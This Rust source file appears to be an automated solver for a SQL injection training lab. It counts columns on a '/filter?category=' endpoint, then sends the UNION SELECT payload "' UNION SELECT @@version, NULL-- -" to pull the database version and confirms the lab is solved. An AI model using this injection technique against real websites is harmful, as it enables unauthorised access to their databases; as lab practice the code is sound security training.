use server_side_sql_injection::{
    HTTP_CLIENT, check_is_lab_solved, fetch_target_string, find_columns_of_type_string,
    find_no_of_columns, generate_clap_parser,
};

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");
    let lab_url_with_endpoint = format!("{lab_url}/filter?category=");

    let target_string = fetch_target_string(lab_url, None);

    let columns = find_no_of_columns(&lab_url_with_endpoint, Some("-- -"), None);

    find_columns_of_type_string(&lab_url_with_endpoint, columns, Some("-- -"), None);

    let query = "' UNION SELECT @@version, NULL-- -";

    logger::info(format!("Making query : {}/filter?category={}", lab_url, query).as_ref());

    let response = HTTP_CLIENT
        .get(format!("{}/filter?category={}", lab_url, query))
        .send()
        .expect("[-] Failed to make the GET request");

    if response.status() == 200 {
        if response
            .text()
            .expect("[-] Failed to extract text from response")
            .contains(&target_string)
        {
            logger::success(
                "Successfully queried the database type and version on MySQL and Microsoft",
            );
        } else {
            panic!(
                "{}",
                logger::error_return("Database version not found in response")
            )
        }
    } else {
        panic!(
            "{}",
            logger::error_return("Failed to fetch the database version")
        )
    }

    check_is_lab_solved(lab_url);
}
